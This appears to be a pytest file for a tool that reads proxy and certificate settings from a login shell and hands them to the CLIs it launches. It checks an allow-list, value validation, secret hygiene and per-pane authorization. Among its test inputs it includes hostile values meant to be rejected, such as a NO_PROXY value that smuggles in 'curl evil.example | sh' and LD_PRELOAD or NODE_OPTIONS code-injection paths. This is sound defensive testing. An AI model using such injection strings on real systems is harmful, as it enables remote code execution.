"""The login shell's proxy and certificate settings, for the CLIs brindle launches
(brindle.login_shell_env). No test runs a real shell: each hands ``read`` or
``load`` a runner that answers as the shell would."""

import asyncio
import logging
import os
import subprocess
import sys
import time
from types import SimpleNamespace

import pytest

from brindle import agents, config, entry, git, login_shell_env, spawn, tmux
from brindle.daemon import holds, lifecycle, peer
from brindle.daemon.app import build_app
from brindle.db import Agent, Workspace

PROXY = "http://builder:hunter2@proxy.corp.example:8080"
PASSPHRASE = "open sesame 42"


def no_process(argv, **kw):
    raise AssertionError(f"a unit test of the launch environment started {argv[:2]}")


def shell(found: dict[str, str], fault: str | None = None):
    """A login shell that exports ``found``, as the runner ``read`` is given sees it:
    what the person's profile printed (a line with "=" in it, as an `echo VAR=...`
    there prints), then the records between the two marks, then their logout's line.
    ``fault``: it hangs past its limit ("hang"), exits non-zero ("exit"), or is cut
    short before its closing mark ("cut")."""
    calls = []
    mark = login_shell_env.MARK.encode() + b"\0"

    def run(argv, **kw):
        calls.append((argv, kw))
        out = (b"CORP_PROFILE=ready\nWelcome back!\n\0" + mark
               + b"".join(f"{k}={v}\0".encode() for k, v in found.items())
               + (b"" if fault == "cut" else mark + b"HTTP_PROXY=http://logout.example:1\n"))
        if fault == "hang":
            raise subprocess.TimeoutExpired(argv, kw["timeout"], out, b"")
        return subprocess.CompletedProcess(argv, 1 if fault == "exit" else 0, out, b"")

    run.calls = calls
    return run


@pytest.mark.parametrize("extra,fault", [
    # Guard (a): every kind of allowed setting is read; a name off the fixed list never is,
    # whatever it holds. Nor is anything the profile printed around the records.
    ({"PATH": "/opt/evil/bin", "NODE_OPTIONS": "--require /opt/evil.js",
      "DYLD_INSERT_LIBRARIES": "/opt/evil.dylib", "LD_PRELOAD": "/opt/evil.so"}, None),
    # Guard (b): a proxy that is no URL (its port is no port).
    ({"HTTP_PROXY": "http://proxy.corp.example:port"}, None),
    pytest.param({"https_proxy": "file:///etc/passwd"}, None, marks=pytest.mark.variant(
        "guard (b): a URL of a scheme no proxy speaks must not reach a CLI as its proxy")),
    pytest.param({"no_proxy": "corp.example; curl evil.example | sh"}, None,
                 marks=pytest.mark.variant("guard (b): a NO_PROXY that is no host list (shell text) is dropped")),
    pytest.param({"SSL_CERT_FILE": "/no/such/bundle.pem"}, None, marks=pytest.mark.variant(
        "guard (b): a certificate path that doesn't exist is dropped")),
    # Guard (c): a shell that hangs past its limit, fails or is cut short gives nothing,
    # valid records or not.
    ({}, "hang"),
    ({}, "exit"),
    pytest.param({}, "cut", marks=pytest.mark.variant(
        "guard (c): records with no closing mark (a shell cut short that still exits 0) must not be half-read")),
])
def test_only_allowed_valid_settings_are_read_from_the_login_shell(tmp_path, caplog, extra, fault):
    cert = tmp_path / "corp-ca.pem"
    cert.write_text("-----BEGIN CERTIFICATE-----\n")
    good = {"HTTPS_PROXY": PROXY, "all_proxy": "socks5h://127.0.0.1:1080",
            "NO_PROXY": "localhost, .corp.example,10.0.0.0/8,[::1]:8443",
            "NODE_EXTRA_CA_CERTS": str(cert), "SSL_CERT_DIR": f"{tmp_path}:{tmp_path}",
            "CLAUDE_CODE_CLIENT_KEY_PASSPHRASE": PASSPHRASE}
    run = shell({**extra, **good}, fault)
    caplog.set_level(logging.DEBUG)
    environ = {"SHELL": "/bin/zsh", "HOME": "/Users/p", "BRINDLE_PRO_TOKEN": "FAKE_PRO_TOKEN"}

    assert login_shell_env.read(run, environ) == ({} if fault else good)

    # Guard (c): once, as a login shell with no terminal to ask at, under a limit, and
    # without the daemon's own secrets in its environment.
    [(argv, kw)] = run.calls
    limit = kw["timeout"]
    assert argv[:3] == ["/bin/zsh", "-l", "-c"] and "-i" not in argv
    assert 0 < limit <= login_shell_env.LIMIT and "input" not in kw
    assert kw["env"] == {"SHELL": "/bin/zsh", "HOME": "/Users/p"}
    # Guard (d): nothing of it is logged, read or not.
    assert not caplog.records


def test_turned_off_nothing_is_read_or_added():
    run = shell({"HTTPS_PROXY": PROXY})
    config.set_user(login_shell_env.SETTING, "off")
    login_shell_env.load(run)
    assert not run.calls
    # Turned off while a daemon that had read them runs: its next launch adds nothing.
    config.set_user(login_shell_env.SETTING, "on")
    login_shell_env.load(run)
    assert login_shell_env.for_launch("claude", environ={}) == {"HTTPS_PROXY": PROXY}
    config.set_user(login_shell_env.SETTING, "off")
    assert login_shell_env.for_launch("claude", environ={}) == {} and not login_shell_env.kept("claude")


@pytest.fixture
def pane_rows(db, tmp_path, monkeypatch):
    """A workspace to launch panes in, by its row only: no repository, and git's own
    lookups for a pane are not these tests'. Nothing allowed is in this environment."""
    db.add_workspace(Workspace("w-1", str(tmp_path), "main", "main", "main", None, str(tmp_path),
                               None, "brindle-x", time.time()))
    monkeypatch.setattr(git, "identity_env", lambda path, env=None: {})
    monkeypatch.setattr(git, "pane_git_config", lambda gh=True: None)
    monkeypatch.setattr(spawn, "read", no_process)
    monkeypatch.setattr(spawn, "action", no_process)
    for name in login_shell_env.ALLOWED:
        monkeypatch.delenv(name, raising=False)
    return db.get_workspace("w-1")


def test_a_launched_cli_gets_the_settings_its_pane_would_start_without(db, pane_rows, tmp_path, monkeypatch):
    """The real launch environment (what the pane's scrub leaves): the login
    shell's settings, never over what the daemon or the pane has already."""
    for provider in ("claude", "codex"):
        db.add_agent(Agent(provider, "w-1", "developer", provider, None, "assign", "idle", "", None, time.time()))
    key = tmp_path / "client.key"
    key.write_text("-----BEGIN PRIVATE KEY-----\n")
    login_shell_env.load(shell({"HTTPS_PROXY": PROXY, "HTTP_PROXY": "http://shell.example:3128",
                                "ALL_PROXY": "socks5://shell.example:1080", "CLAUDE_CODE_CLIENT_KEY": str(key),
                                "CLAUDE_CODE_CLIENT_KEY_PASSPHRASE": PASSPHRASE}))
    # What the daemon's own environment has, or the tmux server hands the pane anyway, is left as it is.
    monkeypatch.setenv("ALL_PROXY", "socks5://daemon.example:1080")
    monkeypatch.setattr(tmux, "inherited_env", lambda *a: {"HTTP_PROXY": "http://tmux.example:3128"})

    envs = {p: agents._effective_window_env(db.get_agent(p), db.get_workspace("w-1")) for p in ("claude", "codex")}

    for env in envs.values():
        assert (env["HTTPS_PROXY"], env["HTTP_PROXY"], env.get("ALL_PROXY")) == (
            PROXY, "http://tmux.example:3128", None)
    # Claude Code's client key and passphrase look like secrets: a Claude pane keeps them
    # past the scrub (secrets.pane_unset), and no other provider's CLI is handed them.
    claude_only = {"CLAUDE_CODE_CLIENT_KEY": str(key), "CLAUDE_CODE_CLIENT_KEY_PASSPHRASE": PASSPHRASE}
    assert {k: envs["claude"].get(k) for k in claude_only} == claude_only
    assert not any(envs["codex"].get(k) for k in claude_only)


class PaneConnection:
    """The shim's connection to the daemon's Unix socket, served by the real app as a
    pane's process reaches it: who is calling by the kernel's word (a pid), and no token."""
    pid = 310
    statuses: list[int] = []

    def __init__(self, path, limit):
        pass

    def request(self, method, url, body, headers):
        sent: list[dict] = []

        async def receive():
            return {"type": "http.request", "body": body.encode(), "more_body": False}

        async def send(message):
            sent.append(message)

        scope = {"type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1", "method": method,
                 "scheme": "http", "path": url, "raw_path": url.encode(), "query_string": b"", "root_path": "",
                 "server": None, "client": None, "headers": [(b"content-type", b"application/json")],
                 peer.PEER_PID: self.pid}
        asyncio.run(build_app("t" * 43)(scope, receive, send))
        PaneConnection.statuses.append(sent[0]["status"])
        self.reply = SimpleNamespace(status=sent[0]["status"], read=lambda: b"".join(
            m.get("body", b"") for m in sent if m["type"] == "http.response.body"))

    def getresponse(self):
        return self.reply

    def close(self):
        pass


@pytest.mark.parametrize("pane_of,status", [
    ("wk", 200),
    # Guard: the worker's settings asked for from another agent's pane. The daemon goes by
    # whose pane the calling process is in, not by the name it gives: refused, nothing read.
    ("other", 403),
])
def test_a_worker_its_supervisors_helper_launched_asks_the_daemon_from_its_own_pane(
        db, pane_rows, tmp_path, monkeypatch, caplog, pane_of, status):
    """A worker is launched by a helper under its supervisor's CLI, which read no login
    shell and must hold no value: its pane asks the daemon, through the shim its command
    starts with. The real launch, the real route behind the daemon's guard, the real shim."""
    caplog.set_level(logging.DEBUG)
    db.add_agent(Agent("wk", "w-1", "developer", "claude", None, "assign", "starting", "", None, time.time()))
    lifecycle.socket_path().touch()         # a daemon to ask
    opened = {}

    def new_window(session, name, cwd, command, env, **kw):
        opened.update(command=command, env=dict(env))
        return "%7"

    monkeypatch.setattr(tmux, "new_window", new_window)
    for fn in ("ensure_session", "apply_theme"):
        monkeypatch.setattr(tmux, fn, lambda *a, **k: None)
    monkeypatch.setattr(tmux, "inherited_names", lambda session: set())
    monkeypatch.setattr(tmux, "inherited_env", lambda session: {})
    # The pane's command is held until the launch lets it go: note what is on record by then.
    monkeypatch.setattr(tmux, "open_gate", lambda channel: opened.update(pane=db.get_agent("wk").tmux_window))

    agents._open_window(db, db.get_agent("wk"), pane_rows, "wk", ["claude-cli", "--resume"], watch_pane=False)

    command = opened["command"]
    # The daemon answers only a pane recorded as the worker's: it is, before the shim
    # (behind the gate's wait, which is what the pane starts with) may run.
    assert opened["pane"] == "%7" and command[0] == "/bin/sh"

    # The daemon, which did read them (in this one process: only from here on).
    key = tmp_path / "client.key"
    key.write_text("-----BEGIN PRIVATE KEY-----\n")
    found = {"HTTPS_PROXY": PROXY, "CLAUDE_CODE_CLIENT_KEY": str(key), "CLAUDE_CODE_CLIENT_KEY_PASSPHRASE": PASSPHRASE}
    login_shell_env.load(shell(found))
    monkeypatch.setattr(peer, "caller_agents", lambda pid: {pane_of} if pid == PaneConnection.pid else set())
    monkeypatch.setattr(holds, "_UnixConnection", PaneConnection)
    monkeypatch.setattr(PaneConnection, "statuses", [])
    started = []
    monkeypatch.setattr(spawn, "become", lambda argv: started.append(
        (argv, {n: os.environ.pop(n) for n in login_shell_env.ALLOWED if n in os.environ})))
    monkeypatch.setattr(sys, "argv", ["brindle", *command[command.index(login_shell_env.SHIM):]])
    with pytest.raises(SystemExit):
        entry.main()            # the pane's process, as tmux starts it once the gate opens

    [(argv, given)] = started
    assert argv[-2:] == ["claude-cli", "--resume"] and login_shell_env.SHIM not in argv
    assert (PaneConnection.statuses, given) == ([status], found if status == 200 else {})
    # The helper never held a value, on its command line or in what it set; nothing is logged.
    told = " ".join([*command, *opened["env"].values(), *(r.getMessage() for r in caplog.records)])
    assert not any(v in told for v in found.values())
